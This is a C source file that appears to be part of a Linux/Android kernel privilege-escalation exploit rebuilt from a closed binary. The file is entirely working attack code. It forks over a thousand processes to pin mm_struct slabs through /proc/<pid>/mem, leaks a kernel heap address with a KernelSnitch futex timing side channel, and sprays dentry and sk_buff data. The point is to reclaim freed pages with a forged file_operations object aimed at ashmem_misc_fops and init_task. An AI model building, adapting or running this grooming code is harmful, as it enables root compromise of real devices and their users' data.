/* source: FUN_00106288's grooming choreography, reused from this
 * project's own proven src/util.c:prepare_kernel_page() (see groom.h for
 * the exact-match evidence). Only the final content write differs: this
 * calls build_fops_install_object() instead of the old engine's
 * put_slide_bank_entry(). */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "fops_install.h"
#include "groom.h"

/* Debug instrumentation (H0): attribute the groom+install wall time to its
 * sub-phases (process spray, KernelSnitch collision search, bruteforce leak).
 * Prints to stderr only; no behavior change. */
static uint64_t groom_now_ms(void) {
  struct timespec ts;
  clock_gettime(CLOCK_MONOTONIC, &ts);
  return (uint64_t)ts.tv_sec * 1000u + (uint64_t)ts.tv_nsec / 1000000u;
}

static void groom_dbg(const char *name, uint64_t t0, uint64_t *last) {
  uint64_t n = groom_now_ms();
  fprintf(stderr, "[groom] dbg phase=%s t=+%llums dt=%llums\n", name,
          (unsigned long long)(n - t0), (unsigned long long)(n - *last));
  *last = n;
}

/* KernelSnitch tuning (experiment): getenv + strtol clamped to [lo,hi],
 * falling back on any parse error or out-of-range value. */
static long groom_env_long_clamped(const char *name, long fallback, long lo,
                                    long hi) {
  const char *raw = getenv(name);
  if (!raw || !*raw) return fallback;
  errno = 0;
  char *end = NULL;
  long v = strtol(raw, &end, 0);
  if (errno != 0 || end == raw || *end != '\0' || v < lo || v > hi) {
    return fallback;
  }
  return v;
}
#include "kernelsnitch/kernelsnitch.h"

#define OSS_PAGE_SIZE 4096
#define OSS_MM_ORDER 3
#define OSS_MM_STRUCT_SZ 0x400
#define OSS_ORDER3_SIZE (OSS_PAGE_SIZE << OSS_MM_ORDER) /* 0x8000 */
#define OSS_SKB_SEND_SIZE FOPS_INSTALL_PAGE_SIZE         /* exact 0x8e80 */
#define OSS_MM_PARTIALS 5
#define OSS_KSNITCH_COLLISIONS 4
#define OSS_SKB_RECLAIM_SENDS 64
#define OSS_DENTRY_SPRAY_PAIRS 64
#define OSS_DENTRY_SPRAY_PER_PAIR 64
#define OSS_DENTRY_SPRAY_MSG_SIZE 0x140

static uint64_t g_last_dentry_object;

static int spray_dentry_fops_image(uint64_t kernel_base,
                                   int sockets[OSS_DENTRY_SPRAY_PAIRS][2]) {
  unsigned char name[DENTRY_FOPS_NAME_SIZE];
  unsigned char message[OSS_DENTRY_SPRAY_MSG_SIZE];
  if (!build_reclaimable_dentry_fops_name(name, kernel_base)) return 0;
  memset(message, 0, sizeof(message));
  memcpy(message + 0x10, name, 0x120);
  int sndbuf = 0x200000;
  size_t sent = 0;
  for (size_t pair = 0; pair < OSS_DENTRY_SPRAY_PAIRS; pair++) {
    sockets[pair][0] = sockets[pair][1] = -1;
    if (socketpair(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0, sockets[pair]) != 0 ||
        setsockopt(sockets[pair][0], SOL_SOCKET, SO_SNDBUF,
                   &sndbuf, sizeof(sndbuf)) != 0 ||
        setsockopt(sockets[pair][1], SOL_SOCKET, SO_RCVBUF,
                   &sndbuf, sizeof(sndbuf)) != 0) return 0;
    for (size_t item = 0; item < OSS_DENTRY_SPRAY_PER_PAIR; item++) {
      if (send(sockets[pair][0], message, sizeof(message), MSG_DONTWAIT) !=
          (ssize_t)sizeof(message)) return 0;
      sent++;
    }
  }
  fprintf(stderr, "[groom] kmalloc-1k binary sprays=%zu/%d\n", sent,
          OSS_DENTRY_SPRAY_PAIRS * OSS_DENTRY_SPRAY_PER_PAIR);
  return sent == OSS_DENTRY_SPRAY_PAIRS * OSS_DENTRY_SPRAY_PER_PAIR;
}

static void close_dentry_spray(int sockets[OSS_DENTRY_SPRAY_PAIRS][2]) {
  for (size_t i = 0; i < OSS_DENTRY_SPRAY_PAIRS; i++) {
    if (sockets[i][0] >= 0) close(sockets[i][0]);
    if (sockets[i][1] >= 0) close(sockets[i][1]);
  }
}

struct mm_ctx {
  size_t mm_cnt;
  pid_t *childs;
  int *memfds;
};

static int pin_reclaim_to_cpu0(void);

static pid_t clone_child(void) {
  pid_t child = syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0);
  if (child == 0) {
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    if (getppid() == 1) {
      _exit(0);
    }
    /* source: FUN_00105ef0 -> FUN_00104bf0 */
    if (pin_reclaim_to_cpu0() != 0) {
      _exit(1);
    }
    for (;;) {
      pause();
    }
  }
  return child;
}

static struct kernelsnitch_shared_state *g_ks;

static pid_t clone_leak_child(void) {
  pid_t child = syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0);
  if (child == 0) {
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    if (getppid() == 1) {
      _exit(1);
    }
    kernelsnitch_find_collisions(g_ks);
    _exit(0);
  }
  return child;
}

static int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return open(path, O_RDONLY);
}

static void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  if (kill(child, SIGKILL) != 0 && errno != ESRCH) {
    return;
  }
  while (waitpid(child, NULL, 0) < 0 && errno == EINTR) {
  }
}

static int init_ctx(struct mm_ctx *ctx, size_t cnt) {
  memset(ctx, 0, sizeof(*ctx));
  ctx->mm_cnt = cnt;
  ctx->childs = calloc(sizeof(pid_t), cnt);
  ctx->memfds = calloc(sizeof(int), cnt);
  if (!ctx->childs || !ctx->memfds) {
    free(ctx->childs);
    free(ctx->memfds);
    memset(ctx, 0, sizeof(*ctx));
    return 0;
  }
  for (size_t i = 0; i < cnt; i++) {
    ctx->childs[i] = -1;
    ctx->memfds[i] = -1;
  }
  return 1;
}

static void cleanup_ctx(struct mm_ctx *ctx) {
  if (!ctx) {
    return;
  }
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds && ctx->memfds[i] >= 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
    if (ctx->childs && ctx->childs[i] > 0) {
      kill_child(ctx->childs[i]);
      ctx->childs[i] = -1;
    }
  }
  free(ctx->childs);
  free(ctx->memfds);
  memset(ctx, 0, sizeof(*ctx));
}

static void release_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->childs);
  free(ctx->memfds);
  memset(ctx, 0, sizeof(*ctx));
}

/* source: fcn.000044f4 (this project's src/main.c:app_main() equivalent),
 * raw vaddr 0x4520-0x4570 -- getrlimit/setrlimit raising RLIMIT_NOFILE
 * and RLIMIT_NPROC's soft limit to the hard limit, confirmed via raw
 * disasm with asm.varsub disabled (r2's default variable naming
 * collided misleadingly with this function's own stack canary slot --
 * double-checked because of that). Applied here (not just in main.c's
 * app_main(), which is the closed binary's real call site) so every
 * test harness in this project that calls groom_and_install_fops_object
 * directly gets the same protection -- this is exactly the class of fix
 * for the "F_SETPIPE_SZ Operation not permitted" fd/pipe-page budget
 * exhaustion this project separately root-caused earlier, and this
 * function is the one that forks and holds open up to ~1279 memfds in
 * one call. Non-fatal here (unlike app_main()'s copy) so a standalone
 * test harness run as a less-privileged user still proceeds and lets
 * the real spray/reclaim logic surface its own, more specific error if
 * fd exhaustion actually becomes a problem. */
static void raise_rlimit_to_max_best_effort(int resource) {
  struct rlimit rl;
  if (getrlimit(resource, &rl) == 0) {
    rl.rlim_cur = rl.rlim_max;
    setrlimit(resource, &rl);
  }
}

/* source: FUN_00104bf0, called by FUN_00106288 immediately after the
 * priming sendmsg. kernelsnitch_bruteforce() deliberately clears the
 * caller's affinity, so the CPU-0 pin done by app_main is no longer in
 * effect here. The closed payload restores it before freeing the mm slabs
 * and allocating the reclaim pages; both operations must use the same
 * per-CPU page lists. */
static int pin_reclaim_to_cpu0(void) {
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(0, &set);
  return sched_setaffinity(0, sizeof(set), &set);
}

static uint64_t groom_and_install_fops_object_impl(
    uint64_t kernel_base, uint64_t ashmem_misc_fops_addr,
    uint64_t init_task_addr) {
  raise_rlimit_to_max_best_effort(RLIMIT_NOFILE);
  raise_rlimit_to_max_best_effort(RLIMIT_NPROC);

  uint64_t dbg_t0 = groom_now_ms();
  uint64_t dbg_last = dbg_t0;

  size_t mm_objs_per_slab = OSS_ORDER3_SIZE / OSS_MM_STRUCT_SZ; /* 32 */

  struct mm_ctx prepare_ctx = {0}, spray_ctx = {0}, pre_ctx = {0},
                post_ctx = {0};
  unsigned char *skb_buf = NULL;
  pid_t child_leak = -1;
  int memfd_leak = -1;
  int reclaim_sv[2] = {-1, -1};
  int pcp_sv[2] = {-1, -1};
  int dentry_spray[OSS_DENTRY_SPRAY_PAIRS][2];
  for (size_t i = 0; i < OSS_DENTRY_SPRAY_PAIRS; i++)
    dentry_spray[i][0] = dentry_spray[i][1] = -1;
  uint64_t result = 0;

  if (!init_ctx(&prepare_ctx, 32 * mm_objs_per_slab) || /* 1024 */
      !init_ctx(&spray_ctx,
                (1 + OSS_MM_PARTIALS) * mm_objs_per_slab) || /* 192 */
      !init_ctx(&pre_ctx, mm_objs_per_slab - 1) ||            /* 31 */
      !init_ctx(&post_ctx, mm_objs_per_slab)) {               /* 32 */
    fprintf(stderr, "[groom] context allocation failed\n");
    goto cleanup;
  }

  skb_buf = malloc(OSS_SKB_SEND_SIZE);
  if (!skb_buf) {
    fprintf(stderr, "[groom] skb buffer allocation failed\n");
    goto cleanup;
  }
  memset(skb_buf, 0x41, OSS_SKB_SEND_SIZE);

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.childs[i] = clone_child();
    if (prepare_ctx.childs[i] < 0) {
      fprintf(stderr, "[groom] prepare clone failed index=%zu errno=%d\n", i,
              errno);
      goto cleanup;
    }
  }
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
    if (prepare_ctx.memfds[i] < 0) {
      fprintf(stderr, "[groom] prepare memfd failed index=%zu errno=%d\n", i,
              errno);
      goto cleanup;
    }
  }
  /* FUN_00106288 kills all 1024 prepare children immediately after every
   * /proc/<pid>/mem fd is open. Those fds alone pin the mm_struct objects;
   * the later two drain waves release selected fds, not live processes. */
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    kill_child(prepare_ctx.childs[i]);
    prepare_ctx.childs[i] = -1;
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.childs[i] = clone_child();
    if (spray_ctx.childs[i] < 0) {
      fprintf(stderr, "[groom] spray clone failed index=%zu errno=%d\n", i,
              errno);
      goto cleanup;
    }
    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
    if (spray_ctx.memfds[i] < 0) {
      fprintf(stderr, "[groom] spray memfd failed index=%zu errno=%d\n", i,
              errno);
      goto cleanup;
    }
  }

  groom_dbg("proc-spray-done", dbg_t0, &dbg_last); /* prepare 1024 + spray 192 */

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  if (cpu_count <= 0) {
    fprintf(stderr, "[groom] invalid online CPU count=%d\n", cpu_count);
    goto cleanup;
  }
  g_ks = kernelsnitch_setup(OSS_MM_STRUCT_SZ, OSS_MM_ORDER, cpu_count,
                             OSS_KSNITCH_COLLISIONS, 0, 0);
  if (!g_ks) {
    fprintf(stderr, "[groom] kernelsnitch setup failed\n");
    goto cleanup;
  }
  {
    /* Experiment knobs; defaults preserve the closed profile. Repeat is
     * bounded by average (>=8) and the fixed __times[] size (<=128). */
    long ks_appended = groom_env_long_clamped(
        "KSNITCH_APPENDED", (long)g_ks->appended_futexes, 256, APPENDED_FUTEXES);
    long ks_repeat = groom_env_long_clamped(
        "KSNITCH_REPEAT", (long)g_ks->repeat_measurement,
        (long)g_ks->average, REPEAT_MEASUREMENT);
    kernelsnitch_set_profile(g_ks, (size_t)ks_appended, (size_t)ks_repeat,
                              g_ks->average);
    fprintf(stderr,
            "[groom] ksnitch profile appended=%zu repeat=%zu average=%zu\n",
            g_ks->appended_futexes, g_ks->repeat_measurement, g_ks->average);
  }
  groom_dbg("ksnitch-setup", dbg_t0, &dbg_last);

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.childs[i] = clone_child();
    if (pre_ctx.childs[i] < 0) {
      fprintf(stderr, "[groom] pre clone failed index=%zu errno=%d\n", i,
              errno);
      goto cleanup;
    }
  }
  child_leak = clone_leak_child();
  if (child_leak < 0) {
    fprintf(stderr, "[groom] leak clone failed errno=%d\n", errno);
    goto cleanup;
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.childs[i] = clone_child();
    if (post_ctx.childs[i] < 0) {
      fprintf(stderr, "[groom] post clone failed index=%zu errno=%d\n", i,
              errno);
      goto cleanup;
    }
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
    if (pre_ctx.memfds[i] < 0) {
      fprintf(stderr, "[groom] pre memfd failed index=%zu errno=%d\n", i,
              errno);
      goto cleanup;
    }
  }
  memfd_leak = open_memfd(child_leak);
  if (memfd_leak < 0) {
    fprintf(stderr, "[groom] leak memfd failed errno=%d\n", errno);
    goto cleanup;
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
    if (post_ctx.memfds[i] < 0) {
      fprintf(stderr, "[groom] post memfd failed index=%zu errno=%d\n", i,
              errno);
      goto cleanup;
    }
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    kill_child(pre_ctx.childs[i]);
    pre_ctx.childs[i] = -1;
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    kill_child(post_ctx.childs[i]);
    post_ctx.childs[i] = -1;
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    kill_child(spray_ctx.childs[i]);
    spray_ctx.childs[i] = -1;
  }
  pid_t leak_waited;
  do {
    leak_waited = waitpid(child_leak, NULL, 0);
  } while (leak_waited < 0 && errno == EINTR);
  if (leak_waited != child_leak) {
    fprintf(stderr, "[groom] leak child wait failed errno=%d\n", errno);
    goto cleanup;
  }
  child_leak = -1;
  groom_dbg("find-collisions-done", dbg_t0, &dbg_last); /* 4096-thread append + scan */

  if (!kernelsnitch_found_collisions(g_ks)) {
    fprintf(stderr, "[groom] kernelsnitch collision finding failed\n");
    goto cleanup;
  }

  kernelsnitch_bruteforce(g_ks);
  uint64_t leaked = g_ks->mm_struct;
  if (leaked == (uint64_t)-1) {
    fprintf(stderr, "[groom] kernelsnitch mm_struct leak failed\n");
    goto cleanup;
  }
  groom_dbg("bruteforce-done", dbg_t0, &dbg_last); /* 8-thread timing leak */

  /* Closed FUN_00106288 derives every kernel pointer from A directly:
   * A = candidate & ~0x7fff. The skb user-data starts at D=A-0xe80, so
   * scratch+0x2000 lands at A+0x1180; D must not replace A in pointers. */
  uint64_t aligned_base = leaked & ~(uint64_t)(OSS_ORDER3_SIZE - 1);
  size_t leaked_index = (size_t)((leaked - aligned_base) / OSS_MM_STRUCT_SZ);
  g_last_dentry_object = aligned_base + leaked_index * OSS_MM_STRUCT_SZ;
  fprintf(stderr, "[groom] mm leaked=%016llx aligned_base=%016llx\n",
          (unsigned long long)leaked, (unsigned long long)aligned_base);

  build_fops_install_object(skb_buf, aligned_base, kernel_base,
                             ashmem_misc_fops_addr, init_task_addr);

  if (socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv) != 0) {
    fprintf(stderr, "[groom] reclaim socketpair failed errno=%d\n", errno);
    goto cleanup;
  }
  int sndbuf = 1 << 20;
  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
  int flags = fcntl(reclaim_sv[0], F_GETFL, 0);
  if (flags >= 0) {
    fcntl(reclaim_sv[0], F_SETFL, flags | O_NONBLOCK);
  }
  if (socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_sv) != 0) {
    fprintf(stderr, "[groom] pcp socketpair failed errno=%d\n", errno);
    goto cleanup;
  }

  struct iovec iov = {.iov_base = skb_buf, .iov_len = OSS_SKB_SEND_SIZE};
  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  ssize_t pcp_sent;
  do {
    pcp_sent = sendmsg(pcp_sv[0], &msg, 0);
  } while (pcp_sent < 0 && errno == EINTR);
  if (pcp_sent != (ssize_t)OSS_SKB_SEND_SIZE) {
    fprintf(stderr,
            "[groom] pcp sendmsg incomplete sent=%zd want=%d errno=%d\n",
            pcp_sent, OSS_SKB_SEND_SIZE, pcp_sent < 0 ? errno : 0);
    goto cleanup;
  }

  if (pin_reclaim_to_cpu0() != 0) {
    fprintf(stderr, "[groom] CPU-0 reclaim pin failed errno=%d\n", errno);
    goto cleanup;
  }

  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();

  /* FUN_00106288 splits the prepare-slab drain in two capped waves.
   * The first 16 leaders are released before the spray/target slabs;
   * the remaining 16 are released only after the leak fd below. */
  size_t prepare_slab_count = prepare_ctx.mm_cnt / mm_objs_per_slab;
  size_t prepare_early_drains = prepare_slab_count;
  if (prepare_early_drains > 16) {
    prepare_early_drains = 16;
  }
  for (size_t i = 0; i < prepare_early_drains; i++) {
    size_t index = i * mm_objs_per_slab;
    close(prepare_ctx.memfds[index]);
    prepare_ctx.memfds[index] = -1;
    kill_child(prepare_ctx.childs[index]);
    prepare_ctx.childs[index] = -1;
  }

  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
    close(spray_ctx.memfds[i]);
    spray_ctx.memfds[i] = -1;
  }
  size_t target_pre = pre_ctx.mm_cnt - 1;
  close(pre_ctx.memfds[target_pre]);
  pre_ctx.memfds[target_pre] = -1;
  close(post_ctx.memfds[0]);
  post_ctx.memfds[0] = -1;
  for (size_t i = 0; i < target_pre; i++) {
    close(pre_ctx.memfds[i]);
    pre_ctx.memfds[i] = -1;
  }
  for (size_t i = 1; i < post_ctx.mm_cnt - 1; i++) {
    close(post_ctx.memfds[i]);
    post_ctx.memfds[i] = -1;
  }

  close(pcp_sv[0]);
  close(pcp_sv[1]);
  pcp_sv[0] = -1;
  pcp_sv[1] = -1;
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  close(memfd_leak);
  memfd_leak = -1;
  if (!spray_dentry_fops_image(kernel_base, dentry_spray)) {
    fprintf(stderr, "[groom] kmalloc-1k dentry spray incomplete\n");
    goto cleanup;
  }
  size_t prepare_late_drains = prepare_slab_count - prepare_early_drains;
  if (prepare_late_drains > 16) {
    prepare_late_drains = 16;
  }
  for (size_t i = 0; i < prepare_late_drains; i++) {
    size_t index = (prepare_early_drains + i) * mm_objs_per_slab;
    close(prepare_ctx.memfds[index]);
    prepare_ctx.memfds[index] = -1;
    kill_child(prepare_ctx.childs[index]);
    prepare_ctx.childs[index] = -1;
  }
  size_t drain_triggers = prepare_early_drains + prepare_late_drains;

  int reclaim_sent = 0;
  int reclaim_incomplete = 0;
  for (int i = 0; i < OSS_SKB_RECLAIM_SENDS; i++) {
    ssize_t sent;
    do {
      errno = 0;
      sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
    } while (sent < 0 && errno == EINTR);
    if (sent == (ssize_t)OSS_SKB_SEND_SIZE) {
      reclaim_sent++;
      continue;
    }
    if (sent < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
      break;
    }
    reclaim_incomplete = 1;
    break;
  }
  fprintf(stderr,
          "[groom] mm drain triggers=%zu sk_buff reclaim sends=%d/%d\n",
          drain_triggers, reclaim_sent, OSS_SKB_RECLAIM_SENDS);

  if (reclaim_sent == 0 || reclaim_incomplete) {
    fprintf(stderr,
            "[groom] reclaim batch rejected full=%d incomplete=%d\n",
            reclaim_sent, reclaim_incomplete);
    goto cleanup;
  }

  groom_dbg("drain-reclaim-done", dbg_t0, &dbg_last); /* build+socketpair+drain+reclaim */

  /* Keep reclaim_sv open: queued skbs must remain alive through trigger. */
  result = aligned_base;
  reclaim_sv[0] = -1;
  reclaim_sv[1] = -1;

cleanup:
  if (g_ks) {
    kernelsnitch_cleanup(g_ks);
    g_ks = NULL;
  }
  if (child_leak > 0) {
    kill_child(child_leak);
  }
  if (memfd_leak >= 0) {
    close(memfd_leak);
  }
  for (size_t i = 0; i < 2; i++) {
    if (pcp_sv[i] >= 0) {
      close(pcp_sv[i]);
    }
    if (reclaim_sv[i] >= 0) {
      close(reclaim_sv[i]);
    }
  }
  if (result) {
    /* Preserve the surviving mm fds through the trigger, matching the old
     * success path. The attempt/keeper process owns their lifetime. */
    release_ctx_storage(&post_ctx);
    release_ctx_storage(&pre_ctx);
    release_ctx_storage(&spray_ctx);
    release_ctx_storage(&prepare_ctx);
  } else {
    close_dentry_spray(dentry_spray);
    cleanup_ctx(&post_ctx);
    cleanup_ctx(&pre_ctx);
    cleanup_ctx(&spray_ctx);
    cleanup_ctx(&prepare_ctx);
  }
  free(skb_buf);
  return result;
}

uint64_t groom_and_install_fops_object(uint64_t kernel_base,
                                        uint64_t ashmem_misc_fops_addr,
                                        uint64_t init_task_addr) {
  return groom_and_install_fops_object_impl(kernel_base, ashmem_misc_fops_addr,
                                             init_task_addr);
}

struct live_candidate_source {
  uint64_t kernel_base;
  uint64_t ashmem_misc_fops_addr;
  uint64_t init_task_addr;
};

static uint64_t groom_live_candidate(void *opaque) {
  struct live_candidate_source *source = opaque;
  return groom_and_install_fops_object_impl(
      source->kernel_base, source->ashmem_misc_fops_addr,
      source->init_task_addr);
}

size_t groom_fops_candidates(uint64_t kernel_base,
                             uint64_t ashmem_misc_fops_addr,
                             uint64_t init_task_addr,
                             struct oss_fops_candidate out[OSS_FOPS_CANDIDATE_COUNT]) {
  struct live_candidate_source source = {kernel_base, ashmem_misc_fops_addr,
                                          init_task_addr};
  memset(out, 0, sizeof(*out) * OSS_FOPS_CANDIDATE_COUNT);
  size_t count = 0;
  for (size_t attempt = 0; attempt < OSS_FOPS_CANDIDATE_ATTEMPTS &&
                           count < OSS_FOPS_CANDIDATE_COUNT; attempt++) {
    uint64_t base = groom_live_candidate(&source);
    uint64_t object = g_last_dentry_object;
    uint64_t page = object & ~0xfffULL;
    if (!base || object < base || object >= base + OSS_ORDER3_SIZE) continue;
    int duplicate = 0;
    for (size_t i = 0; i < count; i++)
      duplicate |= out[i].object == object || out[i].page == page;
    if (duplicate) continue;
    out[count++] = (struct oss_fops_candidate){
        .page = page, .object = object, .pipe_buffer = 0};
  }
  if (count != OSS_FOPS_CANDIDATE_COUNT) {
    memset(out, 0, sizeof(*out) * OSS_FOPS_CANDIDATE_COUNT);
    return 0;
  }
  return count;
}
